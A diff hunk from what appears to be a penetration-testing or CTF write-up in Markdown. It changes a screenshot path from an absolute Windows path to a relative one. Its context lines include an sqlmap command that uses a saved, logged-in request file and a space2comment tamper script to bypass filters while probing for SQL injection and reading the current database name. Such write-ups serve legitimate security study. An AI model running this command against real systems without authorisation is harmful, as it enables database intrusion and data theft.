@@ -42,4 +42,4 @@ Replace the cookie in post.txt after login
 
 sqlmap --batch --tamper=space2comment -r post.txt --current-db
 
-![image-20250218150440806](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250218150440806.png)
+![image-20250218150440806](./assets\image-20250218150440806.png)
